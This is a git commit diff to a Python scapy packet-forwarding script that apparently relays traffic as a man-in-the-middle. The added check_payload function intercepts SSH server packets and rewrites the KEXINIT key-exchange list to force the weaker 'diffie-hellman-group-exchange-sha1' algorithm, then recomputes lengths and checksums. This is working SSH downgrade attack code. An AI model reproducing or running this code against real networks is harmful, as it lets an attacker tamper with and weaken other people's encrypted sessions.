fb991e2c1c85356db7be2d18cc42affe004ae687
root <root@localhost.localdomain>
2018-04-02 16:24:29 -0400

    added shh.py to parse payload

--- main/sniffer.py
+++ main/sniffer.py
@@ -1,6 +1,8 @@
 from scapy.all import *
-import sys, os, time
+import sys, os, time, binascii
+from ssh import SSH
 
+# Get MAC address from IP
 def get_mac(IP):
 	conf.verb = 0
 	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, inter = 0.1)
@@ -9,6 +11,7 @@ def get_mac(IP):
 	#endfor
 #def
 
+# Send packet; fragment if necessary
 def send_pkt (packet):
 	if len(packet) > 1500:
 		frags = fragment(packet,fragsize=500)
@@ -20,11 +23,9 @@ def send_pkt (packet):
 	#endif
 #enddef
 
+# Forward captured packet
 def forward(packet):
-	if packet.haslayer(TCP) and packet.haslayer(Raw) and (packet[TCP].dport == 22 or packet[TCP].sport == 22):
-		print "###[ Raw ]###"
-		print packet[Raw].load
-	#endif 
+	check_payload(packet);
 	myMAC = packet[Ether].dst
 	packet[Ether].dst = EX.get(packet[Ether].src)
 	packet[Ether].src = myMAC
@@ -34,6 +35,33 @@ def forward(packet):
 # Modify payload
 def set_payload(packet):
 	pass
+#enddef
+
+# test
+def check_payload(packet):
+	if not packet.haslayer(TCP) or not packet.haslayer(Raw):
+		return
+	#endif
+	if packet[TCP].dport != 22 and packet[TCP].sport != 22:
+		return
+	#endif
+	try:
+		if packet[TCP].sport == 22:
+			ssh = SSH(packet[Raw].load)
+			old_len = len(packet[Raw].load)
+			if ord(ssh.SSH_MSG_KEXINIT) == int("14",16):
+				ssh.kex_algorithms = "diffie-hellman-group-exchange-sha1"
+				payload_new = ssh.reconstruct()
+				packet[Raw].load = payload_new
+				diff_len = old_len - len(payload_new)
+				packet[IP].len = packet[IP].len - diff_len
+				del packet[TCP].chksum
+				del packet[IP].chksum
+			#endif
+		#endif
+	except Exception as error:
+		print repr(error)
+	#endtry	
 #enddef
 
 if __name__ == '__main__':
